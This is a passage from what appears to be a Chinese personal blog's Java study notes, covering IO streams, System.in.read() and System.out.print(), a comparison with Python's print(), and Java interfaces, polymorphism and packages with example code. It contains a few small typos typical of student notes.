<p><font face="楷体">&amp;emsp;数据流是一串连续不断的数据的集合，就象水管里的水流，在水管的一端一点一点地供水，而在水管的另一端看到的是一股连续不断的水流。数据写入程序可以是一段、一段地向数据流管道中写入数据，这些数据段会按先后顺序形成一个长的数据流。对数据读取程序来说，看不到数据流在写入时的分段情况，每次可以读取其中的任意长度的数据，但只能先读取前面的数据后，再读取后面的数据。不管写入时是将数据分多次写入，还是作为一个整体一次写入，读取时的效果都是完全一样的。<br>&amp;emsp;“流是磁盘或其它外围设备中存储的数据的源点或终点。”<br>在电脑上的数据有三种存储方式，一种是外存，一种是内存，一种是缓存。比如电脑上的硬盘，磁盘，U盘等都是外存，在电脑上有内存条，缓存是在CPU里面的。外存的存储量最大，其次是内存，最后是缓存，但是外存的数据的读取最慢，其次是内存，缓存最快。这里总结从外存读取数据到内存以及将数据从内存写到外存中。对于内存和外存的理解，我们可以简单的理解为容器，即外存是一个容器，内存又是另外一个容器。那又怎样把放在外存这个容器内的数据读取到内存这个容器以及怎么把内存这个容器里的数据存到外存中呢？<br>&amp;emsp;在Java类库中，IO部分的内容是很庞大的，因为它涉及的领域很广泛:<br>标准输入输出，文件的操作，网络上的数据流，字符串流，对象流，zip文件流等等，java中将输入输出抽象称为流，就好像水管，将两个容器连接起来。将数据冲外存中读取到内存中的称为输入流，将数据从内存写入外存中的称为输出流。<br>流是一个很形象的概念，当程序需要读取数据的时候，就会开启一个通向数据源的流，这个数据源可以是文件，内存，或是网络连接。类似的，当程序需要写入数据的时候，就会开启一个通向目的地的流。</font></p>
</blockquote>
</blockquote>
<pre><code>  以上总结的基本概念如下：
</code></pre>
<table><tr><td bgcolor=#F5FFFA><font face="楷体">🌸数据流：一组有序，有起点和终点的字节的数据序列。包括输入流和输出流;
🌸输入流(Input  Stream)：程序从输入流读取数据源。数据源包括外界(键盘、文件、网络…)，即是将数据源读入到程序的通信通道;
🌸输出流：程序向输出流写入数据。将程序中的数据输出到外界（显示器、打印机、文件、网络…）的通信通道。采用数据流的目的就是使得输出输入独立于设备。
Input  Stream不关心数据源来自何种设备（键盘，文件，网络）
Output  Stream不关心数据的目的是何种设备（键盘，文件，网络）
🌸数据流分类：流序列中的数据既可以是未经加工的原始二进制数据，也可以是经一定编码处理后符合某种格式规定的特定数据。因此Java中的流分为两种：
 1)  字节流：数据流中最小的数据单元是字节；
 2)  字符流：数据流中最小的数据单元是字符，Java中的字符是Unicode编码，一个字符占用两个字节。
🌸具体的字节流和字符流区分请看文章《Java:字节流和字符流（输入流和输出流）》和[《Java 字节流与字符流的区别》](https://blog.csdn.net/qq_25184739/article/details/51203733)、[《理解Java中字符流与字节流的区别》](https://www.cnblogs.com/absfree/p/5415092.html)、[《Java:字节流和字符流（输入流和输出流）》](https://www.cnblogs.com/progor/p/9357676.html).
</font></td></tr></table>

<p>&amp;nbsp;</p>
<h4 id="二、System、in、out说明"><a href="#二、System、in、out说明" class="headerlink" title="二、System、in、out说明"></a><font color="#EE3A8C" face="楷体">二、System、in、out说明</font></h4><p><font face="楷体">Java系统自带的标准数据流：java.lang.System:</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java.lang.System     </span><br><span class="line">public final class System  extends Object&#123;     </span><br><span class="line">   static  PrintStream  err;//标准错误流（输出）、err是对象；  </span><br><span class="line">   static  InputStream  <span class="keyword">in</span>;//标准输入(键盘输入流)、<span class="keyword">in</span>是对象；   </span><br><span class="line">   static  PrintStream  out;//标准输出流(显示器输出流)、out是对象.</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure>
<table><tr><td bgcolor=#F5FFFA><font face="楷体">🌼 System类不能创建对象，只能直接使用它的三个静态成员;
🌼 每当main方法被执行时,就自动生成上述三个对象;
🌼 System是java.lang包里面的一个类；
🌼 in是java.io.InputStream类的对象，也是System里面的一个数据成员(也称为字段)；
🌼 read()是java.io.InputStream类里的方法，也就是in对象的方法;
🌼 out是java.io.PrintStream类的对象，也是System里面的一个数据成员(也称为字段)；
🌼 print()、println()是java.io.PrintStream类里的方法，也就是out对象的方法;
</font></td></tr></table>

<p>&amp;nbsp;</p>
<h4 id="三、System-in-read-使用"><a href="#三、System-in-read-使用" class="headerlink" title="三、System.in.read()使用"></a><font color="#EE3A8C" face="楷体">三、System.in.read()使用</font></h4><table><tr><td bgcolor=#F5FFFA><font face="楷体">🌼 System.in.read()方法的作用是按每次读取一个字节（就是ASCII码），然后返回它的<font color="#FF4040">ASCII码十进制</font>;
🌼 从第一次打开System.in输入流开始，以后输入的字节都存放起来，下次从这个里面依次按顺序读取;
🌼 用System.in.read()时，我们在键盘上按下的任何一个键都会被当做是输入值，包括Enter键也会被当做是一个值！当我们按下Enter的时候，实际上发送两个键值：一个回车\t（13），一个是换行\n（10）;
🌼 从键盘输入一个a，char是两个字节存储的，read()一个字节一个字节读取时，暂时把a看作是一个字节，后续深入学习了再来解释😫😂（哈，貌似想通了，当字节流读到字节为0的数据流时会舍去，相当于跳过该字节继续读下一个非0的字节.....后续更新中）----12.27与老师探讨后得知：在流中输入的字符是一个ASCII(即一个字节=8比特)，这个时候就是一个字节，而char存储的时候是按2个字节存储的，注意的是在流中并不是存储，存储一个字符是Unicode码共16位，而流中的ASCII是8位。
建议去读[《java总结输入流输出流》](https://blog.csdn.net/liuxiaogangqq/article/details/25892667)！！！
可参考[Scanner使用方法](https://www.cnblogs.com/ioveNature/p/6797024.html)</font></td></tr></table>

<p><strong>注意事项：</strong></p>
<table><tr><td bgcolor=#F5FFFA><font face="楷体">1、由于在控制台输入时，按下回车键才代表输入完成，输入的内容才会提交到read()方法，所以按下回车之前，程序是不知道你输入了什么的;
2、输入"a"后按下回车，这时候read()方法读到了数据，此时buffer中的数据应该是97 13 10，也就是字符'a','\r','\n'，并且read()方法每次只能从缓冲区中读出一个字符，三次read()就刚好读出这3个字符，之后程序就结束了;
3、只按下回车，此时从流中只读到了"\r"和"\n"，由于没有足够的输入，那么第三次调用read()时阻塞.
参考：[《System.in.read()使用》](https://uule.iteye.com/blog/1128243)；[《System.in输入流深入理解》](https://blog.csdn.net/fengzijinliang/article/details/40741565?utm_source=blogxgwz0)
推荐阅读：[《深入理解JAVA中的IO》](https://www.cnblogs.com/ylspace/p/8128112.html)</font></td></tr></table>

<p>&amp;nbsp;</p>
<h4 id="四、System-out-print-x2F-println"><a href="#四、System-out-print-x2F-println" class="headerlink" title="四、System.out.print()&#x2F;println()"></a><font color="#EE3A8C" face="楷体">四、System.out.print()&#x2F;println()</font></h4><table><tr><td bgcolor=#F5FFFA><font face="楷体">🌼 System.out.print()输出不换行，System.out.print()输出后换行.
参考[《深入理解System.out.print》](https://blog.csdn.net/idealemail/article/details/47318813).</font></td></tr></table>

<p>&amp;nbsp;</p>
<h4 id="五、Java中System-out-print-函数与Python中print-函数的详解"><a href="#五、Java中System-out-print-函数与Python中print-函数的详解" class="headerlink" title="五、Java中System.out.print()函数与Python中print()函数的详解"></a><font color="#EE3A8C" face="楷体">五、Java中System.out.print()函数与Python中print()函数的详解</font></h4><table><tr><td bgcolor=#F5FFFA><font face="楷体">python中的print()函数和java中的System.out.print()函数都有着打印字符串的功能。
(1). <font color="red">python中:</font> print("hello,world!")
输出为：hello,world!
<font color="red">Java中:</font> System.out.print("hello,world!");
输出为：hello,world!
说明这两个函数的用法是一样的.
(2). <font color="red">python中:</font> print("1+1=",1+1)
输出结果为：1+1= 2
<font color="red">Java中:</font> System.out.print("1+1="+(1+1));
输出结果为：1+1=2
说明在使用print()函数的时候，我们用了一个“,”将“1+1=”和1+1的结果连接起来了，这个“,”起着连接的作用。同时，在使用System.out.print()函数的时候，我们用了一个“+”将“1+1=”和1+1的结果连接起来了，这个“+”也是起着连接作用;
我们再来看他们的输出结果，print()输出的是1+1= 2，“=”与“2”之间有一个空格，而System.out.print()输出的是1+1=2，“=”与“2”之间没有空格。这里我们发现python中的print()函数中的“,”不仅起着连接字符串的作用，而且还表示一个空格.

<p><strong>结论：</strong><br><font color="#FF0000">🌼 python中的print()函数的作用和java中的System.out.print()函数的作用是一样的;<br>🌼 print()函数中“,”和System.out.print()函数中“+”都有着连接字符串的作用;<br>🌼 print()函数中“,”还表示一个空格;<br>🌼 不同的语言都有着很多的相似点，不同的语言又有着不同的新特性.</font><br>参考：<a href="https://m.jb51.net/article/128959.htm">《python中print()函数的“,”与java中System.out.print()函数中的“+”功能详解》</a>.<br></font></td></tr></table></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Java接口、包(4.7-4.8)</title>
    <url>/post/Java-Interface-Package5/</url>
    <content><![CDATA[<p>&amp;emsp;<br>&amp;emsp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>接口 & 包</font></center>

<p>&amp;emsp;</p>
<h3 id="一、-接口"><a href="#一、-接口" class="headerlink" title="一、 接口"></a><font color="#FF6347" face="Comic sans MS">一、 接口</font></h3><h4 id="1-1-接口的概念"><a href="#1-1-接口的概念" class="headerlink" title="1.1  接口的概念"></a><font color="#20B2AA" face="Comic sans MS">1.1  接口的概念</font></h4><p><font face="Comic sans MS"><strong>1.  📒使程序设计和实现相互分离：</strong><br>在单继承的继承树中，设计和实现不可避免地要纠缠在一起。在设计的时候，人们也许只想提供一个类的抽象的接口，而不希望去具体实现它，因为那是实现阶段的事情。使用接口类型可以很完美地解决这个问题。</p>
<p><strong>2.📒弥补Java只支持单重继承的不足：</strong><br>   Java的类型层次结构具有一定的局限——它只支持单继承，一个类只能有一个父类，而不能交叉继承树的其它分支中有用的部分。这样就给面向对象的程序设计带来了一些困难。但是多继承的引入使得继承层次结构变得混乱，更加容易出错和产生二义性。</p>
<p><strong>3.📒约束实现接口的类</strong>:<br>接口只是约束实现了该接口的类必须满足接口的要求。<br>当定义一个接口时，实际上是在编写一个契约，用来描述实现其的类能够做什么，能够充当什么角色，具体怎么做和接口无关。</p>
<p><strong>所以，Java抛弃了多继承，引入一种新的层次结构——<font color="red">接口</font>来达到同样的功能。</strong></font></p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">📒**接口和类的区别：** </font> 
 (1) 类只能单继承，而接口可以多继承。
 (2) 类中的方法可以是具体的，也可以抽象的。 接口中的方法都是抽象的。
 (3) 接口中的方法要用类来实现，一个类可以实现多个接口。
<font color="red">📒**注意：**  </font> 
 (1) 接口可以继承：一个接口可以继承多个其它的接口，
 (2) 接口中的方法要用类来实现 。
 (3) 一个类可以实现多个接口 。
 (4) Java接口反映了对象较高层次的抽象，为描述相互似乎没有关系的对象的共性提供了一种有效的手段。</font></td></tr></table>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-2-接口的说明"><a href="#1-2-接口的说明" class="headerlink" title="1.2  接口的说明"></a><font color="#20B2AA" face="Comic sans MS">1.2  接口的说明</font></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[修饰符] interface 接口名[extends] [接口列表]</span><br><span class="line">&#123;</span><br><span class="line">   接口体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&amp;emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>1.  📒首部：</strong></font><br><strong>修饰符：</strong>或者不使用修饰符（同包访问），或者只能使用public（任意访问）。归结为只能使用public或者缺省.<br><strong>extends：</strong>定义父接口，支持多重继承(多个父接口用逗号分隔)<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;public interface Cookable extends Foodable,Printable</p>
<p><font color="#00B2EE"><strong>2.📒接口体：定义常量和抽象方法：</strong></font><br>&amp;emsp;<font color="red"><strong>接口的成员：成员变量和方法</strong></font><br><strong>(1) 接口中的成员变量：</strong>都是隐含public、static、final的——静态最终变量（常量），例如在接口中有下面这行代码：<br>int STEP&#x3D;5;<br>等同于：<br>public static final int STEP&#x3D;5;<br><strong>(2) 接口中的方法：</strong>接口中说明的方法都是抽象方法，所有方法隐含public和abstract的 ，例如 int increment(int x)；<br><font color="red">注意， 接口中的方法不能使用下面的修饰符：</font><br>     static<br>     native或synchronized<br>     final<br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-3-接口的使用"><a href="#1-3-接口的使用" class="headerlink" title="1.3  接口的使用"></a><font color="#20B2AA" face="Comic sans MS">1.3  接口的使用</font></h4><p><font face="Comic sans MS">&amp;emsp;接口自己不能提供方法的实现，接口中的方法必须由类实现。Java语言用关键字implements声明类中将实现的接口。声明接口的形式：<br>&amp;emsp;&amp;emsp;<font color="#00B2EE">[类修饰符]  class类名  [extends子句]  [ implements 子句]</font><br><font color="red"><strong>注意：</strong></font><br>在implements子句中可以包含多个接口类型，各个接口类型之间用逗号隔开。<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[例<span class="number">4</span>-<span class="number">19</span>]  TestInterface.java 接口的使用示例</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Runner</span></span>&#123; <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Swimmer</span></span>&#123; <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span></span>;&#125;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;<span class="function"><span class="keyword">abstract</span> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">extends</span> <span class="title">Animal</span> <span class="keyword">implements</span> <span class="title">Runner</span>,<span class="title">Swimmer</span> </span>&#123;</span><br><span class="line"><span class="comment">//Person是能跑和游泳的动物，所以继承了Animal，同时实现了Runner和Swimmer两个接口</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;System.out.println(<span class="string">&quot;run&quot;</span>);&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span></span>&#123;System.out.println(<span class="string">&quot;swim&quot;</span>);&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;System.out.println(<span class="string">&quot;eat&quot;</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestInterface</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">		TestInterface t=<span class="keyword">new</span> TestInterface();</span><br><span class="line">		Person p=<span class="keyword">new</span> Person();</span><br><span class="line">		t.m1(p);</span><br><span class="line">		t.m2(p);</span><br><span class="line">		t.m3(p);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m1</span><span class="params">(Runner f)</span></span>&#123;f.run();&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m2</span><span class="params">(Swimmer s)</span></span>&#123;s.swim();&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">m3</span><span class="params">(Animal a)</span></span>&#123;a.eat();&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-4-对接口的引用"><a href="#1-4-对接口的引用" class="headerlink" title="1.4  对接口的引用"></a><font color="#20B2AA" face="Comic sans MS">1.4  对接口的引用</font></h4><p><font face="Comic sans MS">&amp;emsp;(1) 接口可以作为一种引用类型来使用。任何实现该接口的类的实例都可以存储在该接口类型的变量中，通过这些变量可以访问类所实现的接口中的方法。Java运行时系统动态地确定该使用哪个类中的方法。</p>
<p>&amp;emsp;(2) 把接口作为一种数据类型可以不需要了解对象所对应的具体的类，而着重于它的交互界面。例如，[例4-18]中Person类实现了Runner接口，可以如下赋值，和子类对象赋给父类对象是类似的：<br>          Runner r&#x3D;new Person();<br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-5-使用接口实现多重继承"><a href="#1-5-使用接口实现多重继承" class="headerlink" title="1.5  使用接口实现多重继承"></a><font color="#20B2AA" face="Comic sans MS">1.5  使用接口实现多重继承</font></h4><p><font face="Comic sans MS">&amp;emsp;程序设计有时需要表达这样的意思：<br>&amp;emsp;&amp;emsp;<font color="#00B2EE"> “x从属于a，也从属于b，也从属于c” </font><br><strong>C++：</strong>多重继承，每个类都有具体的实施细节<br><strong>Java：</strong>接口，只有一个类有具体的实施细节<br></font></p>
<p><img data-src="https://i.loli.net/2018/12/27/5c246b3100ab8.png" alt="图片1.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[例<span class="number">4</span>-<span class="number">20</span>]  Swan.java 接口实现多重继承</span><br><span class="line"><span class="comment">/* Swan表示天鹅类，它继承了animal基础类，并实现了接口canWalk、canSwim、canFly，即天鹅具有</span></span><br><span class="line"><span class="comment">animal的功能，同时也具有行走、游泳和飞行的功能。这就实现了多重继承。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">canWalk</span></span>&#123;   <span class="function"><span class="keyword">void</span> <span class="title">walk</span><span class="params">()</span></span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">canSwim</span></span>&#123; <span class="function"><span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span></span>;&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">canFly</span></span>&#123;<span class="function"><span class="keyword">void</span> <span class="title">fly</span><span class="params">()</span></span>;&#125;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">animal</span></span>&#123;<span class="function"><span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Swan</span> <span class="keyword">extends</span> <span class="title">animial</span> <span class="keyword">implements</span> <span class="title">canWalk</span>,<span class="title">canSwim</span>,<span class="title">canFly</span></span></span><br><span class="line"><span class="class"></span>&#123;	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">walk</span><span class="params">()</span></span></span><br><span class="line"><span class="function">     </span>&#123; System.out.println(<span class="string">&quot;swan walking!&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">swim</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	 </span>&#123; System.out.println(<span class="string">&quot;swan swimming!&quot;</span>);&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fly</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	 </span>&#123; System.out.println(<span class="string">&quot;swan flying!&quot;</span>);&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123; System.out.println(<span class="string">&quot;swan eating!&quot;</span>);&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		Swan swan=<span class="keyword">new</span> Swan();</span><br><span class="line">		swan.walk();</span><br><span class="line">		swan.swim();</span><br><span class="line">		swan.fly();</span><br><span class="line">		swan.eat();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-6-抽象类和接口的选择"><a href="#1-6-抽象类和接口的选择" class="headerlink" title="1.6  抽象类和接口的选择"></a><font color="#20B2AA" face="Comic sans MS">1.6  抽象类和接口的选择</font></h4><p><font color="red"><em><strong>问题：接口和抽象类都可以使设计和实现分离，那么继承结构中的基础类应该定义成一个普通类、抽象类还是接口 ？？</strong></em></font><br><font face="Comic sans MS">(1) 在语法上都是可以的，但是把基础类定义成抽象类或接口往往会增加程序的灵活性和容错性；<br>(2) 如果基础类只是定义一些接口，根本不需要具体的实现，<font color="#00B2EE"> <strong>那么首先优先选择使用接口，接口的抽象程度比抽象类更高；</strong></font><strong>如果基础类必须实现方法或者定义成员变量的时候，才考虑采用抽象类。</strong></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-7-多态"><a href="#1-7-多态" class="headerlink" title="1.7  多态"></a><font color="#20B2AA" face="Comic sans MS">1.7  多态</font></h4><p><font face="Comic sans MS">📒<strong>多个类中的多态：</strong>在具有继承关系的多个类中，子类对父类方法的覆盖（不能是重载父类的方法），即子类和父类可以有相同首部的方法，运行的时间决定每个对象到底执行哪个特定的版本。<br>📒<strong>判断程序中是否存在多态：</strong><font color="red"><strong>继承(覆盖)、向上转型、动态绑定。</strong></font></p>
<p>&amp;emsp;<font color="red"><strong>1. 覆盖：</strong></font>前面已经讲过，如下：<br><img data-src="https://i.loli.net/2019/01/08/5c3473153aa24.png" alt="20-1.png"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[例<span class="number">4</span>-<span class="number">21</span>] Shapes.java 多态性示例<span class="number">1</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shape</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">erase</span><span class="params">()</span> </span>&#123;&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span> <span class="keyword">extends</span> <span class="title">Shape</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;Circle.draw()&quot;</span>); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">erase</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;Circle.erase()&quot;</span>); </span><br><span class="line">  &#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Square</span> <span class="keyword">extends</span> <span class="title">Shape</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;Square.draw()&quot;</span>);  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">erase</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;Square.erase()&quot;</span>); </span><br><span class="line">  &#125;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Shapes</span> </span>&#123;</span><br><span class="line"> <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doShape</span><span class="params">(Shape s)</span></span>&#123;</span><br><span class="line">  s.draw();</span><br><span class="line">  s.erase();  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    Circle c=<span class="keyword">new</span> Circle();</span><br><span class="line">    Square s=<span class="keyword">new</span> Square();</span><br><span class="line">    doShape(c);</span><br><span class="line">    doShape(s);</span><br><span class="line">  &#125;&#125;</span><br><span class="line">运行结果：</span><br><span class="line">Circle.draw()</span><br><span class="line">Circle.erase()</span><br><span class="line">Square.draw()</span><br><span class="line">Square.erase() </span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;<font color="red"><strong>2. 向上转型：</strong></font>子类对象可以直接转换成父类对象，即一个对象除了可以当作自己的类型，还可以作为它的基础类型对待，这种把子类型当作它的基本类型处理的过程，就叫作向上转型（即“Upcasting”）<br><strong>例如：</strong><br>Shape s&#x3D;new Circle();<br>Circle c&#x3D;new Circle();<br>Square s&#x3D;new Square();<br>doShape(c);<br>doShape(s);</p>
<p>&amp;emsp;<font color="red"><strong>3. 动态绑定：</strong></font><br>&amp;emsp;&amp;emsp;绑定：将一个方法调用同一个方法体连接起来<br>&amp;emsp;&amp;emsp;早期绑定：程序运行以前执行绑定；<br>&amp;emsp;&amp;emsp;动态绑定（或后期绑定）：在运行期间执行绑定。<br><font color="#00B2EE"><strong>Java支持动态绑定：能在运行期间判断参数的实际类型，并分别调用适当的方法体，从而实现了多态性。在Java中所有非final和非static的方法都会自动地进行动态绑定。</strong></font><br></font></p>
<p><em>如下代码块：</em><br><img data-src="https://i.loli.net/2018/12/27/5c24716ea85b2.png" alt="21"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shape</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">erase</span><span class="params">()</span> </span>&#123;&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Triangle</span> <span class="keyword">extends</span> <span class="title">Shape</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">draw</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;Triangle.draw()&quot;</span>); &#125;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">erase</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    System.out.println(<span class="string">&quot;Triangle.erase()&quot;</span>);  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Shapes</span> </span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line"> <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doShape</span><span class="params">(Shape s)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> 	s.draw();</span><br><span class="line"> 	s.erase();	 </span><br><span class="line"> &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    Circle c=<span class="keyword">new</span> Circle();</span><br><span class="line">    Square s=<span class="keyword">new</span> Square();</span><br><span class="line">    Triangle t=<span class="keyword">new</span> Triangle();</span><br><span class="line">    doShape(c);</span><br><span class="line">    doShape(s);</span><br><span class="line">    doShape(t) ;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="二、-包"><a href="#二、-包" class="headerlink" title="二、 包"></a><font color="#FF6347" face="Comic sans MS">二、 包</font></h3><h4 id="2-1-包的说明和作用"><a href="#2-1-包的说明和作用" class="headerlink" title="2.1  包的说明和作用"></a><font color="#20B2AA" face="Comic sans MS">2.1  包的说明和作用</font></h4><p><font face="Comic sans MS"><strong>1. 📒包的说明：</strong><br>•    包是用于组织类的一种方式，可以对类进行分组，一个包中可以包含任意数量的类和接s口,本身是一种命名机制，具体的表现就是一个文件夹<br>•    包是一种松散的类的集合：一般不要求处于同一个包中的类有明确的相互关系，如包含、继承等，但是由于同一个包中的类在默认情况下可以相互访问，所以为了方便编程和管理，通常把需要在一起工作的类放在一个包里。</p>
<p><strong>2. 📒包的作用：</strong><br>（1）包能够让程序员将类组织成单元，通过文件夹或目录来组织文件和应用程序；<br>（2）包减少了名称冲突带来的问题，可以防止同名的类发生冲突；<br>（3）包能够更大面积的保护类、变量和方法，而不是分别对每个类进行保护；<br>（4）包可以用于标示类。<br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="2-2-包的创建"><a href="#2-2-包的创建" class="headerlink" title="2.2  包的创建"></a><font color="#20B2AA" face="Comic sans MS">2.2  包的创建</font></h4><p><font face="Comic sans MS"><strong>1. 📒无名包：</strong><br>&amp;emsp;&amp;emsp;系统为每个没有明确指明所属包的.java文件默认创建的包<br>&amp;emsp; &amp;emsp; <font color="#00B2EE"><strong>无名包中的类无法被引用和复用</strong></font></p>
<p><strong>2. 📒有名包：</strong><br>     （1）说明格式   package 包名；<br>       &amp;emsp;&amp;emsp; package SubClass;<br>       &amp;emsp;&amp;emsp; package MyClass.SubClass;<br>     （2）<font color="red"><strong>说明语句必须放在整个.java文件的第一行</strong></font> </p>
<p><strong>3. 📒创建包的含义：</strong><br>      &amp;emsp;创建包就是在当前文件夹下创建一个子文件夹，以便存放这个包中包含的所有类的.class文件.</p>
<p><strong>4.</strong> 📒可以在不同的文件中使用相同的包说明语句，这样就可以将不同文件中的类都包含到相同的程序包中.<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> SubClass;         <span class="keyword">package</span> MyClass.SubClass;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">s1</span></span>&#123;                 <span class="class"><span class="keyword">class</span> <span class="title">s2</span></span>&#123;</span><br><span class="line">……                        ……</span><br><span class="line"> &#125;                         &#125;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
